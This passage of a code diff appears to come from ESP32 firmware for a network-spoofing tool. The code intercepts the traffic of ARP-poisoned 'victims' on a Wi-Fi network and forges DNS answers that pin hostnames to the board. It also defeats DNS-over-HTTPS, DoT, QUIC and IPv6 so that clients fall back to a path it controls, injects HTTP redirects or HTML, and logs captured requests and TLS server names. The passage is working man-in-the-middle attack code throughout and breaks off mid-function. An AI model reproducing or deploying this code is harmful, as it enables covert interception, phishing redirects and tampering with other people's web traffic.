+        const char *needle = kMarkers[m];
+        size_t nlen = strlen(needle);
+        if (nlen > len) continue;
+        for (size_t i = 0; i + nlen <= len; i++) {
+            size_t k = 0;
+            while (k < nlen) {
+                char c = (char)data[i + k];
+                if (c >= 'A' && c <= 'Z') c = (char)(c - 'A' + 'a');
+                if (c != needle[k]) break;
+                k++;
+            }
+            if (k == nlen) return true;
+        }
+    }
+    return false;
+}
+
 static err_t _nsInputHook(struct pbuf *p, struct netif *inp) {
     netif_input_fn next = s_prevInput;
     if (!p || p->tot_len < 34) return next ? next(p, inp) : ERR_OK;
@@ -872,23 +1362,49 @@ static err_t _nsInputHook(struct pbuf *p, struct netif *inp) {
     uint8_t ihl = (uint8_t)((ip[0] & 0x0F) * 4);
     if (ihl < 20 || 14u + ihl + 8u > total) return next ? next(p, inp) : ERR_OK;
 
-    uint8_t proto = ip[9];
-    if (proto != 17 && proto != 6) return next ? next(p, inp) : ERR_OK;
-
     uint32_t srcIp, dstIp;
     memcpy(&srcIp, ip + 12, 4);
     memcpy(&dstIp, ip + 16, 4);
+
+    uint8_t proto = ip[9];
+    if (proto != 17 && proto != 6) {
+        // ICMP and friends: bridge them while forwarding, so a poisoned victim
+        // can still ping and run a path-MTU probe (both are used by the OS
+        // connectivity checks). Without this the ping simply timed out.
+        if (s_forwardActive && _bridgeFrame(scratch, total, srcIp, dstIp)) {
+            pbuf_free(p);
+            return ERR_OK;
+        }
+        return next ? next(p, inp) : ERR_OK;
+    }
 
     const uint8_t *l4 = ip + ihl;
     uint16_t srcPort = ((uint16_t)l4[0] << 8) | l4[1];
     uint16_t dstPort = ((uint16_t)l4[2] << 8) | l4[3];
     const uint8_t *payload = NULL;
-    uint16_t payloadLen = 0;
+    uint16_t payloadLen = 0;   // on-wire payload length (ack math)
+    uint16_t capturedLen = 0;  // bytes actually present in this frame (parsing)
     uint32_t seq = 0, ack = 0;
     uint8_t flags = 0;
     uint8_t kind = 0;
 
     if (proto == 17) {
+        // QUIC (UDP/443) and DNS-over-QUIC (UDP/853) are encrypted and never
+        // reach the HTTP/TLS interceptor. While the engine is running the
+        // victim has no real internet path anyway, so dropping them makes the
+        // client fall back to TCP (TLS to the board) instead of silently
+        // bypassing the redirect. The board's own traffic is already excluded
+        // above by the source MAC.
+        if ((dstPort == 443 || dstPort == 853) && (s_httpActive || s_httpsActive)) {
+            pbuf_free(p);
+            return ERR_OK;
+        }
+        // Not DNS, or DNS nobody in this engine answers: bridge it when
+        // forwarding is on (NTP, DHCP renewals, game traffic, ...).
+        if ((dstPort != 53 || !s_dnsActive) && _bridgeFrame(scratch, total, srcIp, dstIp)) {
+            pbuf_free(p);
+            return ERR_OK;
+        }
         if (dstPort != 53) return next ? next(p, inp) : ERR_OK;
         uint16_t udpLen = ((uint16_t)l4[4] << 8) | l4[5];
         if (udpLen < 8 || (uint16_t)(ihl + udpLen) > (uint16_t)(total - 14)) {
@@ -896,9 +1412,30 @@ static err_t _nsInputHook(struct pbuf *p, struct netif *inp) {
         }
         payload = l4 + 8;
         payloadLen = (uint16_t)(udpLen - 8);
+        capturedLen = payloadLen;
         kind = 0;
     } else {
-        if (dstPort != 80 && dstPort != 8080) return next ? next(p, inp) : ERR_OK;
+        // HTTPS is terminated by the local secure server, not by forged frames.
+        // A connection addressed to this board on the TLS port must reach lwIP
+        // so httpd_ssl can accept it; if the hook swallowed the SYN the
+        // handshake would never happen.
+        if (dstPort == NETSPOOF_HTTPS_PORT && dstIp == (uint32_t)WiFi.localIP()) {
+            return next ? next(p, inp) : ERR_OK;
+        }
+
+        // Remember who is behind an address when it opens a connection to the
+        // board itself: the TLS endpoint works through lwIP, which has no MAC,
+        // and marking a redirected client depends on the IP -> MAC map.
+        if (dstIp == (uint32_t)WiFi.localIP() && (l4[13] & 0x02)) _fwdLearn(srcIp, scratch + 6);
+
+        // DNS-over-TLS (TCP/853) is blocked while the engine runs: it would
+        // resolve names behind this engine's back. Dropping it makes Android's
+        // Private DNS and DoT clients fall back to the plain resolver.
+        if (dstPort == 853 && (s_httpActive || s_httpsActive)) {
+            pbuf_free(p);
+            return ERR_OK;
+        }
+
         uint8_t dataOff = (uint8_t)((l4[12] >> 4) * 4);
         if (dataOff < 20 || 14u + ihl + dataOff > total) return next ? next(p, inp) : ERR_OK;
         // Host order: _handleHttp() adds to these and _put32() writes host order.
@@ -906,22 +1443,102 @@ static err_t _nsInputHook(struct pbuf *p, struct netif *inp) {
         ack = _rd32(l4 + 8);
         flags = l4[13];
         payload = l4 + dataOff;
-        payloadLen = (uint16_t)(total - 14 - ihl - dataOff);
-        // A bare SYN opens the connection: answer it so a GET can follow (see
-        // _handleSyn()). Without this the client never gets a handshake and the
-        // interception path is unreachable on a real network.
-        if (payloadLen == 0 && (flags & 0x02) && !(flags & 0x10)) {
-            kind = 2;
-        } else {
-            if (payloadLen < 8) return next ? next(p, inp) : ERR_OK;
-            kind = 1;
+
+        // The TCP payload length comes from the IP header, not from the frame
+        // length. An ethernet frame is padded to 60 bytes, so a bare 40-byte
+        // ACK arrives with six padding bytes after the TCP header. Deriving the
+        // length from the frame made every such ACK look like a 6-byte data
+        // segment of "another protocol" and the engine reset the connection
+        // before the request was ever sent. IPv4's total length excludes the
+        // padding and is the only correct source.
+        uint16_t ipTotal = ((uint16_t)ip[2] << 8) | ip[3];
+        if (ipTotal < ihl) return next ? next(p, inp) : ERR_OK;
+        uint16_t frameLen = (uint16_t)(total - 14 - ihl - dataOff);
+        payloadLen = ipTotal > (uint16_t)(ihl + dataOff) ? (uint16_t)(ipTotal - ihl - dataOff) : 0;
+        uint16_t copyLen = payloadLen < frameLen ? payloadLen : frameLen;
+        if (copyLen > NETSPOOF_HOOK_COPY) copyLen = NETSPOOF_HOOK_COPY;
+        capturedLen = copyLen;
+
+        // A reset belongs to a real connection once traffic is bridged: it has
+        // to reach the other end, never be consumed here.
+        if (s_forwardActive && (flags & 0x04) && _bridgeFrame(scratch, total, srcIp, dstIp)) {
+            pbuf_free(p);
+            return ERR_OK;
         }
+
+        // Never answer a reset with a reset: a client that already gave up on
+        // the flow (or a stray RST from the network) is consumed so the engine
+        // cannot start an RST ping-pong with it.
+        if (s_httpActive || s_httpsActive) {
+            if (flags & 0x04) {
+                pbuf_free(p);
+                return ERR_OK;
+            }
+        }
+
+        // Any TCP port is a candidate: a bare SYN is answered so the client can
+        // send its request even when the site is an admin panel on 8000, 8888,
+        // etc. The first data segment decides what the flow is.
+        if (payloadLen == 0 && (flags & 0x02) && !(flags & 0x10)) {
+            kind = 2; // SYN
+        } else if (copyLen >= 5 && payload[0] == 0x16 && payload[1] == 0x03) {
+            kind = 3; // TLS ClientHello to an address we cannot terminate here
+        } else if (copyLen >= 4 && _looksHttp((const char *)payload, copyLen)) {
+            kind = 1; // plaintext HTTP request, on any port
+        } else if (payloadLen > 0) {
+            kind = 4; // another TCP protocol: reset it instead of hanging
+        } else {
+            kind = 0; // bare ACK / FIN of a flow this board is not answering
+        }
+
+        // Bridge everything this board does not answer itself - a SYN, a TLS
+        // handshake to a real server, another TCP protocol, a bare ACK or FIN.
+        // This has to happen *after* the classification above: while it was the
+        // last arm of that chain, every SYN/TLS/other frame had already matched
+        // an earlier arm and was queued instead of bridged, so the client lost
+        // its internet the moment the poison went up. Only a plaintext HTTP
+        // request (kind 1) stays here; a DoH ClientHello is reset on purpose so
+        // the browser falls back to the system resolver.
+        bool bridgedFlow = kind == 1 && _flowBridged(srcIp, dstIp, srcPort, dstPort);
+        bool ownFlow = kind == 2 && s_httpActive && _plainHttpPort(dstPort); // answered here, not bridged
+        if (s_forwardActive && !ownFlow && (kind != 1 || bridgedFlow) &&
+            !(kind == 3 && _tlsLooksLikeDoh(payload, capturedLen)) &&
+            _bridgeFrame(scratch, total, srcIp, dstIp)) {
+            // Remember a bridged handshake: the payload of this flow must go the
+            // same way, or the client ends up with half a connection.
+            if (kind == 2) _flowMark(srcIp, dstIp, srcPort, dstPort);
+            pbuf_free(p);
+            return ERR_OK;
+        }
+
+        if (kind == 0 && (s_httpActive || s_httpsActive)) {
+            // The bare ACK (or FIN/RST) that completes a connection this hook
+            // answered. Passing it to lwIP makes the stack see a segment for a
+            // socket it never opened and reply with a RST - which kills the
+            // forged HTTP response before the client reads it. This matters
+            // most now that a redirect points DNS at the board itself. The
+            // victim's TCP state is the only state this connection has, so the
+            // packet is consumed here.
+            pbuf_free(p);
+            return ERR_OK;
+        }
+        if (kind == 0) return next ? next(p, inp) : ERR_OK;
     }
     if (!payloadLen && kind != 2) return next ? next(p, inp) : ERR_OK;
 
+#if NETSPOOF_TRACE
+    if (dstPort == 80 || srcPort == 80) {
+        Serial.printf(
+            "[NSTRACE] rx %u->%u fl=%02X len=%u seq=%lu ack=%lu kind=%u\n", srcPort, dstPort, flags,
+            payloadLen, (unsigned long)seq, (unsigned long)ack, kind
+        );
+    }
+#endif
+
     // Cheap filter so the slot pool is not wasted on unrelated traffic.
-    if (kind == 2) {
-        // nothing to parse: the SYN is answered from its headers
+    if (kind == 2 || kind == 3 || kind == 4) {
+        // The SYN is answered from its headers; TLS and other TCP are handled
+        // in the service task (SNI logging + reset).
     } else if (kind == 0) {
         uint16_t txid;
         char name[80];
@@ -929,15 +1546,12 @@ static err_t _nsInputHook(struct pbuf *p, struct netif *inp) {
         if (!_dnsQuestion(payload, payloadLen, &txid, name, sizeof(name), &qtype, &qclass)) {
             return next ? next(p, inp) : ERR_OK;
         }
-    } else {
-        const char *txt = (const char *)payload;
-        bool looksHttp = (memcmp(txt, "GET ", 4) == 0 || memcmp(txt, "POST", 4) == 0 ||
-                          memcmp(txt, "HEAD", 4) == 0 || memcmp(txt, "PUT ", 4) == 0 ||
-                          memcmp(txt, "DELE", 4) == 0 || memcmp(txt, "OPTI", 4) == 0);
-        if (!looksHttp) return next ? next(p, inp) : ERR_OK;
     }
 
     NetSpoofSlot *slot = _slotClaim();
+#if NETSPOOF_TRACE
+    if (!slot && (dstPort == 80 || srcPort == 80)) Serial.println("[NSTRACE] slot pool busy -> lwIP");
+#endif
     if (!slot) return next ? next(p, inp) : ERR_OK; // pool busy: let it through
 
     memcpy(slot->clientMac, scratch + 6, 6);
@@ -949,8 +1563,11 @@ static err_t _nsInputHook(struct pbuf *p, struct netif *inp) {
     slot->seq = seq;
     slot->ack = ack;
     slot->flags = flags;
-    slot->payloadLen = payloadLen;
+    slot->payloadLen = payloadLen; // on-wire length: the ACK math needs all of it
+    // Only the captured bytes are parsed, so a request larger than the hook copy
+    // still gets the right ACK number while its body is truncated.
     slot->copyLen = payloadLen < NETSPOOF_HOOK_COPY ? payloadLen : NETSPOOF_HOOK_COPY;
+    if (slot->copyLen > capturedLen) slot->copyLen = capturedLen;
     memcpy(slot->data, payload, slot->copyLen);
     _slotPublish(slot);
 
@@ -965,6 +1582,11 @@ static err_t _nsInputHook(struct pbuf *p, struct netif *inp) {
 
 static void _hookInstall() {
     if (s_hookedNetif) return;
+    // Every forged frame is sent with s_myMac as its source. The ARP paths set
+    // it, but a headless start that has no ARP pair yet used to leave it zero:
+    // the AP then dropped each SYN-ACK/response and the client timed out while
+    // the engine reported itself armed. Refresh it whenever the hook goes in.
+    esp_wifi_get_mac(WIFI_IF_STA, s_myMac);
     struct netif *iface = _staNetif();
     if (!iface) return;
     s_prevInput = iface->input;
@@ -1085,10 +1707,29 @@ static bool _txTcpRaw(
     acc = _sum16(tcp, l4Len, acc);
     _put16(tcp + 16, _finish16(acc));
 
-    return _txEth(dstMac, s_myMac, 0x0800, ip, 20 + l4Len);
+    bool ok = _txEth(dstMac, s_myMac, 0x0800, ip, 20 + l4Len);
+#if NETSPOOF_TRACE
+    if (srcPort == 80 || dstPort == 80) {
+        Serial.printf(
+            "[NSTRACE] tx %u->%u fl=%02X seq=%lu ack=%lu len=%u ok=%d\n", srcPort, dstPort, flags,
+            (unsigned long)seq, (unsigned long)ack, (unsigned)payloadLen, (int)ok
+        );
+    }
+#endif
+    return ok;
 }
 
-static void _capturePush(const NetSpoofSlot *slot, const char *method, const char *host, const char *path, uint8_t action) {
+/**
+ * @brief Push one capture into the ring.
+ *
+ * Called from the service task or the HTTPS server task, never from the
+ * receive hook. @p clientIpWire is the address in network byte order, the same
+ * form the hook copies off the IP header.
+ */
+static void _capturePushEx(
+    uint8_t kind, uint32_t clientIpWire, const char *clientMac, const char *method, const char *host,
+    const char *path, const char *data, uint8_t action
+) {
     _lock();
     NetSpoofCapture *ring = s_captures();
     if (ring == nullptr) { // no 4 KB anywhere: lose the capture, not the attack
@@ -1100,23 +1741,37 @@ static void _capturePush(const NetSpoofSlot *slot, const char *method, const cha
     NetSpoofCapture &c = ring[0];
     memset(&c, 0, sizeof(c));
     c.ts = millis();
-    c.kind = slot->kind;
+    c.kind = kind;
     c.action = action;
-    IPAddress clientAddr(slot->srcIp);
-    c.clientIp = clientAddr;
-    String m = _macStr(slot->clientMac);
-    strncpy(c.clientMac, m.c_str(), sizeof(c.clientMac) - 1);
+    c.clientIp = IPAddress(clientIpWire);
+    if (clientMac) strncpy(c.clientMac, clientMac, sizeof(c.clientMac) - 1);
     if (method) strncpy(c.method, method, sizeof(c.method) - 1);
     if (host) strncpy(c.host, host, sizeof(c.host) - 1);
     if (path) strncpy(c.path, path, sizeof(c.path) - 1);
-    size_t n = slot->copyLen < NETSPOOF_CAPTURE_PAYLOAD - 1 ? slot->copyLen : NETSPOOF_CAPTURE_PAYLOAD - 1;
+    if (data) {
+        size_t n = 0;
+        while (data[n] && n < NETSPOOF_CAPTURE_PAYLOAD - 1) n++;
+        for (size_t i = 0; i < n; i++) {
+            char ch = data[i];
+            c.data[i] = (ch >= 32 && ch < 127) ? ch : '.';
+        }
+    }
+    s_captureCount++;
+    s_captureTotal++;
+    _unlock();
+}
+
+/// Push a capture from a queued L2 slot (DNS or plaintext HTTP).
+static void _capturePush(const NetSpoofSlot *slot, const char *method, const char *host, const char *path, uint8_t action) {
+    String m = _macStr(slot->clientMac);
+    char snippet[NETSPOOF_CAPTURE_PAYLOAD];
+    size_t n = slot->copyLen < sizeof(snippet) - 1 ? slot->copyLen : sizeof(snippet) - 1;
     for (size_t i = 0; i < n; i++) {
         char ch = (char)slot->data[i];
-        c.data[i] = (ch >= 32 && ch < 127) ? ch : '.';
+        snippet[i] = (ch >= 32 && ch < 127) ? ch : '.';
     }
-    c.data[n] = '\0';
-    s_captureCount++;
-    _unlock();
+    snippet[n] = '\0';
+    _capturePushEx(slot->kind, slot->srcIp, m.c_str(), method, host, path, snippet, action);
 }
 
 // --- DNS rules ------------------------------------------------------------
@@ -1188,7 +1843,169 @@ bool netspoof_dns_lookup(const String &name, IPAddress &ip) {
     return _dnsValueIp(value, ip);
 }
 
+/// Byte offset just past the question section of a DNS query (0 when invalid).
+static size_t _dnsQuestionEnd(const uint8_t *dns, size_t len) {
+    if (len < 12) return 0;
+    size_t pos = 12;
+    while (pos < len) {
+        uint8_t label = dns[pos++];
+        if (label == 0) break;
+        if ((label & 0xC0) == 0xC0) return 0; // compression is invalid in a question
+        if (pos + label > len) return 0;
+        pos += label;
+    }
+    if (pos + 4 > len) return 0;
+    return pos + 4;
+}
+
+/**
+ * @brief Answer a DNS query with NOERROR and no records.
+ *
+ * Used for AAAA (28), SVCB (64) and HTTPS (65) lookups. A dual-stack client
+ * that gets a real AAAA answer will use IPv6, which this engine cannot poison;
+ * a real HTTPS RR lets it try HTTP/3 over QUIC, which it also cannot intercept.
+ * An empty answer makes both fall back to the IPv4/TCP path, which the engine
+ * does control. The header and question are copied from the query so the client
+ * matches it to its transaction.
+ */
+static bool _sendEmptyDns(NetSpoofSlot *slot, size_t qEnd) {
+    uint8_t out[512];
+    if (qEnd < 12 || qEnd > sizeof(out) || qEnd > slot->copyLen) return false;
+    memcpy(out, slot->data, qEnd);
+    out[2] = 0x81; // QR=1, RD=1
+    out[3] = 0x80; // RA=1, RCODE=0
+    out[4] = 0;
+    out[5] = 1; // QDCOUNT
+    out[6] = 0;
+    out[7] = 0; // ANCOUNT
+    out[8] = 0;
+    out[9] = 0; // NSCOUNT
+    out[10] = 0;
+    out[11] = 0; // ARCOUNT
+    return _txUdpRaw(slot->clientMac, slot->dstIp, slot->srcIp, 53, slot->srcPort, out, qEnd);
+}
+
 /// Handle one queued DNS query: match a rule and answer it.
+/// Clients that already received a redirect or a page.
+///
+/// After that, everything the client loads (the page it was redirected to, its
+/// scripts, the stream from another host) has to resolve for real, or every
+/// subresource would be pinned back to this board and the target could never
+/// finish loading. Entries expire, so a second site visited later is intercepted
+/// again.
+#define NETSPOOF_SERVED_MAX 32 // a 200-host run logs many distinct clients
+#define NETSPOOF_SERVED_MS 30000
+static struct {
+    uint8_t mac[6];
+    uint32_t ts;
+} s_served[NETSPOOF_SERVED_MAX];
+static int s_servedCount = 0;
+
+static void _markServed(const uint8_t *mac) {
+    if (_isZeroMac(mac)) return;
+    static int cursor = 0;
+    portENTER_CRITICAL(&s_fwdMux);
+    for (int i = 0; i < s_servedCount; i++) {
+        if (_sameMac(s_served[i].mac, mac)) {
+            s_served[i].ts = millis();
+            portEXIT_CRITICAL(&s_fwdMux);
+            return;
+        }
+    }
+    int slot = s_servedCount;
+    if (slot >= NETSPOOF_SERVED_MAX) {
+        slot = cursor;
+        cursor = (cursor + 1) % NETSPOOF_SERVED_MAX;
+    } else {
+        s_servedCount++;
+    }
+    memcpy(s_served[slot].mac, mac, 6);
+    s_served[slot].ts = millis();
+    portEXIT_CRITICAL(&s_fwdMux);
+}
+
+static bool _isServed(const uint8_t *mac) {
+    bool served = false;
+    uint32_t now = millis();
+    portENTER_CRITICAL(&s_fwdMux);
+    for (int i = 0; i < s_servedCount; i++) {
+        if (_sameMac(s_served[i].mac, mac) && (now - s_served[i].ts) < NETSPOOF_SERVED_MS) {
+            served = true;
+            break;
+        }
+    }
+    portEXIT_CRITICAL(&s_fwdMux);
+    return served;
+}
+
+static void _markServedIp(const IPAddress &ip) {
+    uint8_t mac[6];
+    if (_fwdPeerMac((uint32_t)ip, mac)) _markServed(mac);
+}
+
+/// True when a name must keep resolving for real while everything else is
+/// pinned to the board (the hosts a redirect points at).
+static bool _dnsPassMatch(const String &name) {
+    if (s_passCount == 0) return false;
+    String q = name;
+    q.toLowerCase();
+    for (int i = 0; i < s_passCount; i++) {
+        String h = s_passHosts[i];
+        if (h.length() == 0) continue;
+        if (q == h) return true;
+        if (q.length() > h.length() && q.endsWith(h) && q[q.length() - h.length() - 1] == '.') return true;
+    }
+    return false;
+}
+
+/// Resolve a name through the station's own resolver, cached for two minutes
+/// (negative results too, so a dead name is not retried on every query).
+///
+/// Runs in the service task and blocks; only names that must stay reachable take
+/// this path, and the answer is reused for every client asking the same name.
+static bool _resolveUpstream(const String &name, IPAddress &out) {
+    struct Entry {
+        String name;
+        IPAddress ip;
+        uint32_t ts;
+    };
+    static Entry cache[4];
+    uint32_t now = millis();
+    for (int i = 0; i < 4; i++) {
+        if (cache[i].name.length() && cache[i].name.equalsIgnoreCase(name) &&
+            (now - cache[i].ts) < 120000UL) {
+            if ((uint32_t)cache[i].ip == 0) return false;
+            out = cache[i].ip;
+            return true;
+        }
+    }
+    IPAddress ip;
+    // No timeout overload on this core; the blocking resolve is why the answer
+    // is cached and only names that must stay reachable take this path.
+    bool ok = WiFi.hostByName(name.c_str(), ip) == 1;
+    for (int i = 3; i > 0; i--) cache[i] = cache[i - 1];
+    cache[0].name = name;
+    cache[0].ip = ok ? ip : IPAddress((uint32_t)0);
+    cache[0].ts = now;
+    out = ip;
+    return ok;
+}
+
+/// Minimal DNS answer carrying an RCODE and no records (NXDOMAIN etc.).
+static bool _sendDnsStatus(NetSpoofSlot *slot, size_t qEnd, uint16_t txid, uint8_t rcode) {
+    size_t qlen = (qEnd > 12 && qEnd <= NETSPOOF_HOOK_COPY) ? qEnd - 12 : 0;
+    if (12 + qlen > sizeof(s_l4b)) return false;
+    uint8_t *d = s_l4b;
+    memset(d, 0, 12 + qlen);
+    d[0] = (uint8_t)(txid >> 8);
+    d[1] = (uint8_t)(txid & 0xFF);
+    d[2] = 0x81;                            // QR + RD
+    d[3] = (uint8_t)(0x80 | (rcode & 0x0F)); // RA + RCODE
+    d[5] = 1;                               // QDCOUNT
+    if (qlen) memcpy(d + 12, slot->data + 12, qlen);
+    return _txUdpRaw(slot->clientMac, slot->dstIp, slot->srcIp, 53, slot->srcPort, d, 12 + qlen);
+}
+
 static void _handleDns(NetSpoofSlot *slot) {
     uint16_t txid = 0, qtype = 0, qclass = 0;
     char name[80];
@@ -1197,8 +2014,59 @@ static void _handleDns(NetSpoofSlot *slot) {
     s_dnsQueries++;
     String qname(name);
 
+    // Firefox asks for this canary to decide whether DNS-over-HTTPS is safe to
+    // use; NXDOMAIN is the documented "no DoH here" answer. Without it a
+    // DoH-first browser resolves everything itself and never sees a rule.
+    if (qtype == 1 && qname.equalsIgnoreCase("use-application-dns.net")) {
+        size_t qEnd = _dnsQuestionEnd(slot->data, slot->copyLen);
+        if (qEnd && _sendDnsStatus(slot, qEnd, txid, 3)) s_dnsAnswers++;
+        _capturePush(slot, "DNS", name, "canary: no DoH", 1);
+        return;
+    }
+
+    // A redirect target must stay reachable, and a client that has already been
+    // redirected must be able to load what it was sent to: both resolve for
+    // real. Everything else stays pinned to the board so it is intercepted.
+    bool passthrough =
+        (s_passCount > 0 && _dnsPassMatch(qname)) || (s_forwardActive && _isServed(slot->clientMac));
+    if (qtype == 1 && passthrough) {
+        IPAddress real;
+        if (_resolveUpstream(qname, real)) {
+            size_t payloadLen =
+                wifi_build_dns_response(s_l4b, sizeof(s_l4b), txid, name, real.toString().c_str(), 60);
+            if (payloadLen &&
+                _txUdpRaw(slot->clientMac, slot->dstIp, slot->srcIp, 53, slot->srcPort, s_l4b, payloadLen)) {
+                s_dnsAnswers++;
+                _capturePush(slot, "DNS", name, real.toString().c_str(), 1);
+                return;
+            }
+        }
+        // A failed real lookup falls through to the pin, so the client still
+        // reaches the engine instead of getting nothing.
+    }
+
+    // Force the IPv4/TCP path while intercepting: no AAAA, no SVCB/HTTPS RR.
+    if ((qtype == 28 || qtype == 64 || qtype == 65) && (s_httpsActive || s_httpActive)) {
+        size_t qEnd = _dnsQuestionEnd(slot->data, slot->copyLen);
+        if (qEnd && _sendEmptyDns(slot, qEnd)) s_dnsAnswers++;
+        _capturePush(slot, "DNS", name, qtype == 28 ? "no AAAA" : "no SVCB", 1);
+        return;
+    }
+
     IPAddress answer;
-    if (!netspoof_dns_lookup(qname, answer)) {
+    bool haveAnswer = false;
+
+    // While the HTTPS endpoint is running, every A query must land on this
+    // board or the victim's TLS connection never reaches the local server.
+    // This deliberately takes precedence over the user's DNS rules: a specific
+    // rule (e.g. "example.com 1.2.3.4") would otherwise send HTTPS to a host
+    // that cannot present a certificate for the name.
+    if (s_httpsActive && qtype == 1 && WiFi.isConnected()) {
+        answer = WiFi.localIP();
+        haveAnswer = (uint32_t)answer != 0;
+    }
+    if (!haveAnswer) haveAnswer = netspoof_dns_lookup(qname, answer);
+    if (!haveAnswer) {
         _capturePush(slot, "DNS", name, "", 0);
         return;
     }
@@ -1350,6 +2218,40 @@ static void _handleSyn(NetSpoofSlot *slot) {
     );
 }
 
+/// The rule selected for one web request (shared by HTTP and HTTPS).
+struct NetSpoofWebDecision {
+    int redirect = -1;
+    int inject = -1;
+    String location;
+    String html;
+};
+
+/**
+ * @brief Pick the redirect/injection rule for a request.
+ *
+ * Redirects win over injections, exactly as the plaintext path always did.
+ * @p url carries the scheme (http:// or https://) as well as the host and path,
+ * and the Host header is matched on its own too.
+ */
+static void _webDecide(const String &host, const String &url, NetSpoofWebDecision &d) {
+    _ensure_mutex();
+    _lock();
+    for (int i = 0; i < s_redirCount && d.redirect < 0; i++) {
+        if (_httpRuleMatch(s_redirRules[i], host, url)) d.redirect = i;
+    }
+    for (int i = 0; i < s_injectCount && d.inject < 0; i++) {
+        if (_httpRuleMatch(s_injectRules[i], host, url)) d.inject = i;
+    }
+    if (d.redirect >= 0) {
+        d.location = s_redirRules[d.redirect].value;
+        s_redirRules[d.redirect].hits++;
+    } else if (d.inject >= 0) {
+        d.html = s_injectRules[d.inject].value;
+        s_injectRules[d.inject].hits++;
+    }
+    _unlock();
+}
+
 /// Handle one queued HTTP request: match a rule and answer it.
 static void _handleHttp(NetSpoofSlot *slot) {
     s_httpRequests++;
@@ -1358,29 +2260,10 @@ static void _handleHttp(NetSpoofSlot *slot) {
     _parseHttp(slot->data, slot->copyLen, method, path, host);
     String url = "http://" + host + path;
 
-    // Pick the rule that applies: redirects win over injections.
-    String location, html;
-    uint8_t action = 0;
-    int redirectIdx = -1, injectIdx = -1;
+    NetSpoofWebDecision d;
+    _webDecide(host, url, d);
 
-    _ensure_mutex();
-    _lock();
-    for (int i = 0; i < s_redirCount && redirectIdx < 0; i++) {
-        if (_httpRuleMatch(s_redirRules[i], host, url)) redirectIdx = i;
-    }
-    for (int i = 0; i < s_injectCount && injectIdx < 0; i++) {
-        if (_httpRuleMatch(s_injectRules[i], host, url)) injectIdx = i;
-    }
-    if (redirectIdx >= 0) {
-        location = s_redirRules[redirectIdx].value;
-        s_redirRules[redirectIdx].hits++;
-    } else if (injectIdx >= 0) {
-        html = s_injectRules[injectIdx].value;
-        s_injectRules[injectIdx].hits++;
-    }
-    _unlock();
-
-    if (redirectIdx < 0 && injectIdx < 0) {
+    if (d.redirect < 0 && d.inject < 0) {
         _capturePush(slot, method.c_str(), host.c_str(), path.c_str(), 0);
         return;
     }
@@ -1388,17 +2271,18 @@ static void _handleHttp(NetSpoofSlot *slot) {
     // The response must fit one ethernet frame: 1514 - 14 eth - 20 ip - 20 tcp.
     const size_t kMaxPayload = 1450;
     size_t payloadLen;
-    if (redirectIdx >= 0) {
+    uint8_t action = 0;
+    if (d.redirect >= 0) {
         // A long Location is trimmed: an over-long redirect is worse than a
         // slightly different one, because an oversized frame never leaves.
-        while (location.length() > 900) location = location.substring(0, location.length() - 1);
+        while (d.location.length() > 900) d.location = d.location.substring(0, d.location.length() - 1);
         payloadLen = _buildHttpResponse(
-            (char *)s_l4b, kMaxPayload, 302, "Found", NULL, String(), location
+            (char *)s_l4b, kMaxPayload, 302, "Found", NULL, String(), d.location
         );
         action = 1;
     } else {
         payloadLen = _buildHttpResponse(
-            (char *)s_l4b, kMaxPayload, 200, "OK", "text/html; charset=utf-8", html, String()
+            (char *)s_l4b, kMaxPayload, 200, "OK", "text/html; charset=utf-8", d.html, String()
         );
         action = 2;
     }
@@ -1418,10 +2302,132 @@ static void _handleHttp(NetSpoofSlot *slot) {
         s_l4b, payloadLen
     );
     if (sent) {
+        // The response says Connection: close, so close too. Without the FIN the
+        // client keeps a half-open socket until its own timeout (curl and the
+        // raw test client both waited the full 5-8 s for an EOF that never came).
+        _txTcpRaw(
+            slot->clientMac, slot->dstIp, slot->srcIp, slot->dstPort, slot->srcPort,
+            slot->ack + payloadLen, ack, 0x11, NULL, 0
+        );
         if (action == 1) s_httpRedirected++;
         else s_httpInjected++;
+        // Remember the client: from now on its lookups resolve for real, so the
+        // page it was redirected to can actually load.
+        _markServed(slot->clientMac);
     }
     _capturePush(slot, method.c_str(), host.c_str(), path.c_str(), sent ? action : 0);
+}
+
+/**
+ * @brief Extract the SNI host name from a TLS ClientHello.
+ *
+ * Only the first record is inspected; a ClientHello normally fits in one and
+ * the hook copies 640 bytes. Every length is bounds-checked, so a malformed or
+ * truncated hello simply yields an empty name instead of reading past the
+ * captured bytes.
+ */
+static bool _tlsSni(const uint8_t *d, size_t len, char *out, size_t cap) {
+    if (out == nullptr || cap == 0) return false;
+    out[0] = '\0';
+    if (len < 9 || d[0] != 0x16 || d[1] != 0x03) return false; // TLS handshake
+
+    size_t recordLen = ((size_t)d[3] << 8) | d[4];
+    size_t end = 5 + recordLen;
+    if (recordLen == 0 || end > len) end = len; // truncated copy: parse what we have
+
+    const uint8_t *hs = d + 5;
+    size_t hsLen = end - 5;
+    if (hsLen < 4 || hs[0] != 0x01) return false; // ClientHello
+    size_t helloLen = ((size_t)hs[1] << 16) | ((size_t)hs[2] << 8) | hs[3];
+    if (helloLen + 4 < hsLen) hsLen = helloLen + 4;
+
+    size_t p = 4;
+    if (p + 34 > hsLen) return false; // version + random
+    p += 34;
+    if (p + 1 > hsLen) return false;
+    size_t sid = hs[p++];
+    if (p + sid > hsLen) return false;
+    p += sid;
+    if (p + 2 > hsLen) return false;
+    size_t cs = ((size_t)hs[p] << 8) | hs[p + 1];
+    p += 2;
+    if (p + cs > hsLen) return false;
+    p += cs;
+    if (p + 1 > hsLen) return false;
+    size_t cm = hs[p++];
+    if (p + cm > hsLen) return false;
+    p += cm;
+    if (p + 2 > hsLen) return false;
+    size_t extLen = ((size_t)hs[p] << 8) | hs[p + 1];
+    p += 2;
+    size_t extEnd = p + extLen;
+    if (extEnd > hsLen) extEnd = hsLen;
+
+    while (p + 4 <= extEnd) {
+        uint16_t type = ((uint16_t)hs[p] << 8) | hs[p + 1];
+        size_t elen = ((size_t)hs[p + 2] << 8) | hs[p + 3];
+        p += 4;
+        if (p + elen > extEnd) break;
+        if (type == 0 && elen >= 5) { // server_name
+            const uint8_t *e = hs + p;
+            size_t listLen = ((size_t)e[0] << 8) | e[1];
+            size_t listEnd = 2 + listLen;
+            if (listEnd > elen) listEnd = elen;
+            size_t q = 2;
+            while (q + 3 <= listEnd) {
+                uint8_t nameType = e[q];
+                size_t nlen = ((size_t)e[q + 1] << 8) | e[q + 2];
+                q += 3;
+                if (q + nlen > listEnd) break;
+                if (nameType == 0 && nlen > 0) {
+                    size_t n = nlen < cap - 1 ? nlen : cap - 1;
+                    for (size_t i = 0; i < n; i++) {
+                        char c = (char)e[q + i];
